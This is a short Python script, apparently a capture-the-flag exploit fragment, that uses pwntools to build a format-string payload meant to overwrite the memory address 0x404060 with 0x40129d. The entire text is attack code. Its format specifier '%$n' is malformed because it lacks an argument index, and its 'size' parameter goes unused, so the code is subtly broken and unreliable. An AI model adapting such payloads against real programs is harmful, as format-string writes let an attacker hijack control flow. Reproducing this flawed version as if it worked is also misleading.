from pwn import *

def write (addr, value, size):
    payload = f"%0{value}d%$n".encode() + p64(addr)
    return payload

write(0x404060, 0x40129d, 8)